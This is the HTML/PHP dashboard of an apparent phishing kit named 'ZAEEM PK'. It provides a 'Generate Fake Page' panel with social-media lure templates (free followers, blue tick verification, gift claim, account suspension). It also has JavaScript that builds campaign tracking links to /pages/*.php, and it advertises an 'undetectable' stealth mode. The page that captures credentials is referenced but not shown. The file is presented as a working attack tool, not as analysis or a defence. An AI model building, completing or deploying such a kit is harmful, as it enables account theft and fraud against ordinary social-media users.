<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZAEEM PK — User Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0A0A0A;
            color: #fff;
            font-family: 'Segoe UI', Arial, sans-serif;
            padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
            background: #141414;
            padding: 20px 30px;
            border-radius: 15px;
            border: 1px solid #00F5FF;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 25px;
        }
        .zaeem-title {
            font-size: 26px;
            font-weight: 900;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .gold-text {
            background: linear-gradient(45deg, #00F5FF, #FFD700);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .subtitle { color: #888; font-size: 13px; display: block; }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }
        .stat-card {
            background: #141414;
            padding: 20px;
            border-radius: 12px;
            border: 1px solid #2A2A4A;
            text-align: center;
        }
        .stat-card i { font-size: 24px; color: #00F5FF; display: block; margin-bottom: 5px; }
        .stat-card h3 { color: #888; font-size: 12px; }
        .stat-card p { font-size: 24px; font-weight: 700; }
        .generate-box {
            background: #141414;
            padding: 25px;
            border-radius: 12px;
            border: 1px solid #2A2A4A;
            margin-bottom: 25px;
        }
        .generate-box h2 { font-size: 18px; color: #00F5FF; margin-bottom: 15px; }
        .generate-box select, .generate-box input {
            padding: 12px 16px;
            background: #0A0A0A;
            border: 1px solid #2A2A4A;
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            margin-right: 10px;
            margin-bottom: 10px;
        }
        .btn-gen {
            padding: 12px 30px;
            background: linear-gradient(45deg, #00F5FF, #FFD700);
            border: none;
            border-radius: 8px;
            color: #000;
            font-weight: 700;
            cursor: pointer;
        }
        .btn-gen:hover { transform: scale(1.05); }
        .link-box {
            margin-top: 15px;
            padding: 15px;
            background: #0A0A0A;
            border-radius: 8px;
            border: 1px solid #00F5FF;
            display: none;
        }
        .link-box input {
            width: 70%;
            padding: 10px;
            background: #000;
            border: none;
            color: #00F5FF;
            font-size: 13px;
            border-radius: 5px;
        }
        .link-box button {
            padding: 10px 18px;
            background: #00F5FF;
            border: none;
            border-radius: 5px;
            color: #000;
            font-weight: 700;
            cursor: pointer;
        }
        .footer {
            text-align: center;
            padding: 20px;
            color: #555;
            font-size: 13px;
            border-top: 1px solid #1A1A2E;
        }
        .footer i { color: #FF2D55; }
        @media (max-width: 600px) {
            .header { flex-direction: column; text-align: center; }
            .generate-box select, .generate-box input { width: 100%; margin-right: 0; }
            .link-box input { width: 100%; margin-bottom: 10px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <div>
                <h1 class="zaeem-title"><i class="fas fa-link"></i> <span class="gold-text">ZAEEM PK</span> 🇵🇰🙌🏻</h1>
                <span class="subtitle">User Panel — Link Generator</span>
            </div>
            <div><span style="color:#888;"><i class="fas fa-user"></i> User_<?php echo rand(100,999); ?></span></div>
        </header>

        <div class="stats-grid">
            <div class="stat-card"><i class="fas fa-link"></i><h3>Links Generated</h3><p id="linkCount">0</p></div>
            <div class="stat-card"><i class="fas fa-eye"></i><h3>Total Views</h3><p id="viewCount">0</p></div>
        </div>

        <div class="generate-box">
            <h2><i class="fas fa-wand-magic-sparkles"></i> Generate Fake Page</h2>
            <select id="templateSelect">
                <option value="followers">📈 Free Followers</option>
                <option value="verify">✅ Blue Tick</option>
                <option value="gift">🎁 Gift Claim</option>
                <option value="suspension">⚠️ Suspension</option>
            </select>
            <input type="text" id="campaignName" placeholder="Campaign Name" value="Campaign_<?php echo rand(100,999); ?>">
            <button onclick="generateLink()" class="btn-gen"><i class="fas fa-link"></i> Generate</button>
            <div class="link-box" id="linkBox">
                <input type="text" id="generatedLink" readonly>
                <button onclick="copyLink()"><i class="fas fa-copy"></i> Copy</button>
            </div>
        </div>

        <div style="background:#141414; padding:20px; border-radius:12px; border:1px solid #2A2A4A; text-align:center; color:#555;">
            <i class="fas fa-shield-halved" style="font-size:30px; color:#00F5FF; display:block; margin-bottom:10px;"></i>
            <p style="font-size:14px;">Stealth Mode Active — Undetectable Security Layer</p>
        </div>

        <footer class="footer"><i class="fas fa-skull"></i> © 2026 <strong class="gold-text">ZAEEM PK 🇵🇰🙌🏻</strong></footer>
    </div>

    <script>
        let count = 0;
        function generateLink() {
            const template = document.getElementById('templateSelect').value;
            const campaign = document.getElementById('campaignName').value;
            const ref = Math.random().toString(36).substring(2, 8).toUpperCase();
            const link = window.location.origin + '/pages/' + template + '.php?ref=' + ref + '&camp=' + encodeURIComponent(campaign);
            document.getElementById('generatedLink').value = link;
            document.getElementById('linkBox').style.display = 'block';
            count++;
            document.getElementById('linkCount').innerHTML = count;
            document.getElementById('viewCount').innerHTML = Math.floor(Math.random() * 50) + 10;
        }
        function copyLink() {
            const link = document.getElementById('generatedLink');
            link.select();
            document.execCommand('copy');
            alert('Link Copied!');
        }
    </script>
</body>
</html>
